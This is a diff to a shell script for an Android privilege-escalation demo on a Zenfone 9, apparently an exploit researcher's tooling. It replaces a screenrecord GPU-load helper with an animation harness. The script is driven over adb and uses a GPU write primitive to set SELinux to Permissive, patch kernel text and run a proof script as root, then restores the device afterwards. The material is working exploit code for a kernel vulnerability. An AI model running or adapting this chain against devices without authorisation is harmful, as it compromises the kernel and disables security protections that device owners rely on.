@@ -4,15 +4,30 @@
 set -u
 [ -f "$(dirname "$0")/../device.env" ] && . "$(dirname "$0")/../device.env"
 S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
+
+# --- GPU activity harness -------------------------------------------------------------
+# The primitives only take effect while the display is awake and the GPU is actively rendering.
+# A background screenrecord is NOT sufficient (measured 0/4 writes idle/dark vs 3/4 awake+animating).
+gpu_anim_start() {
+    # idempotent: don't disturb an animation the caller already started
+    if adb -s "$S" shell 'pgrep -f anim.sh >/dev/null 2>&1' </dev/null >/dev/null 2>&1; then
+        adb -s "$S" shell 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' </dev/null >/dev/null 2>&1
+        return 0
+    fi
+    adb -s "$S" push "$(dirname "$0")/../src/anim.sh" /data/local/tmp/anim.sh </dev/null >/dev/null 2>&1
+    adb -s "$S" shell 'chmod 755 /data/local/tmp/anim.sh; svc power stayon true' </dev/null >/dev/null 2>&1
+    adb -s "$S" shell 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' </dev/null >/dev/null 2>&1
+    adb -s "$S" shell 'nohup sh /data/local/tmp/anim.sh >/dev/null 2>&1 &' </dev/null >/dev/null 2>&1
+    sleep 3
+}
+gpu_anim_stop() {
+    adb -s "$S" shell 'pkill -f anim.sh' </dev/null >/dev/null 2>&1
+    adb -s "$S" shell 'svc power stayon false' </dev/null >/dev/null 2>&1
+}
 DIR=$(cd "$(dirname "$0")" && pwd)
 LOG=$HOME/Dev/zenfone9-root/logs/root-demo-$(date +%Y%m%d-%H%M%S)
 mkdir -p "$LOG"
 
-gpu_load_start() {
-    adb -s "$S" shell 'screenrecord --time-limit 1800 /data/local/tmp/gpuload.mp4 >/dev/null 2>&1 &' </dev/null >/dev/null 2>&1
-    sleep 2
-}
-gpu_load_stop() { adb -s "$S" shell 'pkill -f screenrecord' </dev/null >/dev/null 2>&1; }
 
 # NOTE: reads race too when the GPU is idle, so patch-dwords.sh keeps a screenrecord load alive
 # for the whole operation. This script additionally keeps the screen awake between steps.
@@ -44,7 +59,7 @@ restore() {
     echo "[demo] restoring kernel text..."
     "$DIR/patch-dwords.sh" restore 2>&1 | tail -1
     echo "[demo] restoring SELinux Enforcing..."
-    gpu_load_stop
+    gpu_anim_stop
     sel 0x01010001 Enforcing >/dev/null || echo "[demo] WARNING: SELinux not restored - reboot will fix"
     echo "[demo] clean: text pristine, SELinux Enforcing"
 }
@@ -53,7 +68,7 @@ trap restore EXIT INT TERM
 adb -s "$S" push "$DIR/../src/proof.sh" /data/local/tmp/proof.sh </dev/null >/dev/null
 adb -s "$S" shell 'chmod 755 /data/local/tmp/proof.sh' </dev/null >/dev/null
 
-gpu_load_start   # must be running before ANY GPU-primitive op, including the SELinux flip
+gpu_anim_start   # must be running before ANY GPU-primitive op, including the SELinux flip
 echo "[demo] SELinux -> Permissive (GPU load active)"
 sel 0x01010000 Permissive || { echo "[demo] SELinux flip FAILED - aborting before patch"; exit 1; }
 echo "[demo] getenforce: $(adb -s "$S" shell getenforce </dev/null 2>&1)"
@@ -69,7 +84,7 @@ echo "[demo] patch verified: FULLY PATCHED"
 # something can re-assert enforcing shortly after boot, so re-check right before rooting
 sel 0x01010000 Permissive || { echo "[demo] SELinux not permissive - root would be killed"; exit 1; }
 echo "[demo] getenforce (pre-root): $(adb -s "$S" shell getenforce </dev/null 2>&1)"
-gpu_load_start   # the root call + proof reads are GPU-primitive ops too: keep the GPU busy
+gpu_anim_start   # the root call + proof reads are GPU-primitive ops too: keep the GPU busy
 echo "[demo] === running proof.sh AS ROOT ==="
 adb -s "$S" shell '/data/local/tmp/call_capset sh /data/local/tmp/proof.sh' </dev/null 2>&1 | tee "$LOG/proof.txt"
 
